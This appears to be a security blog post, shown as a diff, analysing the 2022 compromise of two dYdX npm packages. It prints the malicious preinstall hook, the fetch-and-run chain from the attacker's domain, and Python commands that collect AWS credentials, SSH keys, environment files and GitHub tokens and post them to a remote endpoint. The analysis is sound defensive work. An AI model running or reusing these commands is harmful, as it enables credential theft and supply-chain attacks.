@@ -1,0 +1,39 @@
+
+Shortly before 12:00 PM UTC on September 23, 2022, our platform alerted us to a malicious package publication for packages owned by dYdX. It currently remains unclear how these packages became compromised. What is clear, however, is that this issue was promptly identified and reported to the appropriate individuals by security researcher Maciej Mensfeld. Maciej and his team were quick in notifying dydx, getting an advisory published and getting the offending packages removed from NPM. [1].
+The offending packages and versions are:
+@dydxprotocol/perpetual >= 1.2.2, <= 1.2.3
+@dydxprotocol/solo >= 0.41.1, <= 0.41.2
+Any machines using these packages should be considered completely compromised.
+For the sake of discussion, we’ll focus on just one of these packages: @dydxprotocol/perpetual. If you’d like to follow along at home, a copy of the malicious package %40dydxprotocol%2Fperpetual ⚠️ Check Package and all remote malicious scripts can be retrieved from our Github.
+Shortly before the attack, on September 14, 2022, the malware authors registered the circle-cdn.com domain [2] which they will use as the primary launching point for their attack.
+As with most malicious NPM packages, an innocuous preinstall hook was slotted into the packages.json file which makes a call to the aforementioned domain.
+"preinstall": "curl -s http://api.circle-cdn.com/ci.js | sh",
+The file fetched from http://api.circle-cdn.com/ci.js contains the following:
+curl http://api.circle-cdn.com/setup.py --output cisetup.py >> /dev/null 2>&1 && python3 cisetup.py && rm cisetup.py
+Which in turn pulls and executes the setup.py from http://api.circle-cdn.com/setup.py.
+Once executed, this malicious Python file will enumerate the system and ship off critical system information to the malware authors.
+Near the top of this file we see the following (which are later executed in a subprocess.getoutput):
+acmd = "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"bcmd = "cd ~/.aws && cat credentials"ccmd = "printenv"cdcmd = '"cd ~/.ssh && ls && cat *"ipcmd = "ip addr show"catenvcmd = "cd ~/ && ls .env* && cat .env*"ghcmd = "gh auth status --show-token"
+Here the attacker attempts to:
+
+Determine AWS IAM roles and credential information
+Read any credentials stored for AWS access
+Retrieve environment variables
+Read SSH keys from the machine
+Pull information about network interfaces
+Check the authentication status to Github
+This data is eventually joined into a single string and shipped off to a remote endpoint:
+if os.path.exists('.env') or os.path.exists('/root/.env') or os.path.exists('/home/*/.env'):
+    # ... Clipped for brevity ...
+    # Identical to the code below, except the output from `cd ~/ && ls .env* && cat .env*`
+    # is added to the data shipped off.
+else:
+    filename1 = str(random.randint(0, 99999999999)) + '.txt'
+    filename2 = str(filename1)
+    with open(filename2, 'a') as d:
+        d.write(all8 + '\n')
+    subprocess.getoutput("curl -X POST http://api.circle-cdn.com/uploader.php -F 'uploaded_file=@" + filename2 + "' -F 'submit=Upload'")    subprocess.getoutput("curl -X POST http://api.circle-cdn.com/api.php -d 'textdata=" + all8 + "'")
+    os.remove(filename2)
+At this point the attacker has all the information to continue their attacks and, quite possibly, pivot to other infrastructure. If you are impacted by this, it is highly recommended that you roll your SSH keys and take steps to lock down your AWS infrastructure.
+[1] Maciej made numerous attempts to reach dydx directly (via Twitter, Reddit and email) but did not receive a timely response. Without his efforts to quickly address this problem, these packages may have had a much larger impact on the community. Excellent work Maciej!
+[2] This choice of malware domain is a clear attempt to hide behind the fact that CircleCI is in use in the affected repositories.
